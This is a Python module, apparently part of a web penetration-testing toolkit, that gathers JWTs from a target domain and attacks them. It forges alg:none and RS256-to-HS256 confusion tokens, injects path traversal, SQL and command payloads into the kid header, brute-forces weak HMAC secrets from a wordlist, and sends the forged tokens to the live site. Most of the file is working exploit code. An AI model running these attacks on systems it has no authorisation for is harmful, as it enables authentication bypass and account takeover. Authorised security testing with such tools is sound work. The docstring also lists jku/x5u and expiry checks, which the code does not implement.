"""
modules/jwt_attack.py
---------------------
JWT misconfiguration testing:
- alg:none attack
- Algorithm confusion (RS256 → HS256)
- kid injection (path traversal, SQLi, command)
- Weak secret brute force (small wordlist)
- jku/x5u header abuse
- Expired / no-exp tokens
"""

import re
import json
import base64
import hmac
import hashlib
from pathlib import Path
from typing import List, Dict, Optional

from core.logger import get_logger, info, ok, warn, skip
from core.utils import (
    safe_request, write_lines, ensure_dir, load_json, dedupe
)
from modules._common import (
    load_urls, module_dir, save_finding, cli_main
)

log = get_logger("jwt_attack")


# ─────────────────────────────────────────
# JWT helpers
# ─────────────────────────────────────────
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")


def b64url_decode(s: str) -> bytes:
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def decode_jwt(token: str) -> Optional[Dict]:
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return {"header": header, "payload": payload, "signature": parts[2] if len(parts) > 2 else ""}
    except Exception:
        return None


def craft_none_jwt(token: str) -> Optional[str]:
    """alg:none attack with signature stripped."""
    d = decode_jwt(token)
    if not d:
        return None
    header = dict(d["header"])
    header["alg"] = "none"
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(d["payload"], separators=(",", ":")).encode())
    return f"{h}.{p}."


def craft_alg_confusion_hs256(token: str, public_key_pem: str) -> Optional[str]:
    """
    If server uses RS256 but accepts HS256 signed with the public key.
    """
    d = decode_jwt(token)
    if not d:
        return None
    header = dict(d["header"])
    header["alg"] = "HS256"
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(d["payload"], separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def craft_kid_injection(token: str, kid_payload: str) -> Optional[str]:
    """
    kid header injection: e.g. ../../dev/null, ' OR 1=1--
    """
    d = decode_jwt(token)
    if not d:
        return None
    header = dict(d["header"])
    header["kid"] = kid_payload
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(d["payload"], separators=(",", ":")).encode())
    return f"{h}.{p}.AAAA"


def brute_weak_secret(token: str, wordlist: Optional[List[str]] = None) -> Optional[str]:
    """
    Brute force weak HS256 secret with a small default wordlist.
    """
    d = decode_jwt(token)
    if not d or d["header"].get("alg") not in ("HS256", "HS384", "HS512"):
        return None
    parts = token.split(".")
    if len(parts) != 3:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = parts[2]

    wordlist = wordlist or _default_secrets()
    for secret in wordlist:
        try:
            algo = d["header"].get("alg", "HS256").lower().replace("hs", "sha")
            sig = hmac.new(secret.encode(), signing_input, getattr(hashlib, algo)).digest()
            if b64url_encode(sig) == expected_sig:
                return secret
        except Exception:
            continue
    return None


def _default_secrets() -> List[str]:
    return [
        "secret", "password", "123456", "admin", "jwt", "changeme",
        "secret123", "jwt_secret", "your-256-bit-secret",
        "supersecret", "test", "key", "private", "token",
        "mysecretkey", "HS256", "jwtkey", "default", "null",
        "undefined", "true", "false", "0", "1",
    ]


# ─────────────────────────────────────────
# Extract JWTs from responses
# ─────────────────────────────────────────
def extract_jwts_from_urls(urls: List[str], max_urls: int = 30) -> List[Dict]:
    """Fetch URLs, scan for JWTs in bodies/headers."""
    hits: List[Dict] = []
    for url in urls[:max_urls]:
        r = safe_request(url, timeout=10)
        if not r:
            continue
        # Body
        for m in JWT_RE.finditer(r.text or ""):
            hits.append({"token": m.group(0), "source": url, "where": "body"})
        # Headers
        for k, v in r.headers.items():
            for m in JWT_RE.finditer(v or ""):
                hits.append({"token": m.group(0), "source": url, "where": f"header:{k}"})

    # Dedupe by token
    seen = set()
    out = []
    for h in hits:
        if h["token"] in seen:
            continue
        seen.add(h["token"])
        out.append(h)
    return out


# ─────────────────────────────────────────
# Main entry
# ─────────────────────────────────────────
def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "jwt_attack", output_root)
    urls = load_urls(domain, output_root)
    if not urls:
        info("No URLs — nothing to test")
        return {"count": 0, "findings": []}

    info(f"Scanning {min(len(urls), 30)} URLs for JWT tokens")
    tokens = extract_jwts_from_urls(urls)
    if not tokens:
        info("No JWTs found — module done")
        return {"count": 0, "findings": []}

    info(f"Found {len(tokens)} JWT token(s)")

    findings: List[Dict] = []

    for item in tokens:
        token = item["token"]
        source = item["source"]
        decoded = decode_jwt(token)
        if not decoded:
            continue

        header = decoded["header"]
        alg = (header.get("alg") or "").upper()

        # 1. alg:none
        none_tok = craft_none_jwt(token)
        if none_tok:
            r = safe_request(source, headers={"Authorization": f"Bearer {none_tok}"}, timeout=10)
            if r and r.status_code == 200:
                findings.append({
                    "type": "jwt_alg_none",
                    "url": source,
                    "evidence": f"alg:none accepted at {source}",
                    "severity": "critical",
                    "confidence": 60,
                })
                save_finding(domain, "jwt_attack", "jwt_alg_none", "critical",
                             source, evidence=f"alg:none accepted", confidence=60,
                             scan_id=scan_id, output_root=output_root)

        # 2. Weak secret
        if alg in ("HS256", "HS384", "HS512"):
            secret = brute_weak_secret(token)
            if secret:
                findings.append({
                    "type": "jwt_weak_secret",
                    "url": source,
                    "evidence": f"weak secret: {secret}",
                    "severity": "critical",
                    "confidence": 95,
                })
                save_finding(domain, "jwt_attack", "jwt_weak_secret", "critical",
                             source, evidence=f"weak secret: {secret}",
                             confidence=95, scan_id=scan_id, output_root=output_root)

        # 3. kid injection attempts
        for kid_payload in ["../../dev/null", "' OR 1=1--", "../../../etc/passwd", "|id"]:
            t = craft_kid_injection(token, kid_payload)
            if not t:
                continue
            r = safe_request(source, headers={"Authorization": f"Bearer {t}"}, timeout=10)
            if r and r.status_code == 200:
                findings.append({
                    "type": "jwt_kid_injection",
                    "url": source,
                    "evidence": f"kid={kid_payload} accepted",
                    "severity": "high",
                    "confidence": 50,
                })

    # Save
    if findings:
        write_lines(mdir / "jwt_findings.txt",
                    [f"[{f['severity']}] {f['type']} → {f['url']}" for f in findings])

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "jwt_attack", run, args.output)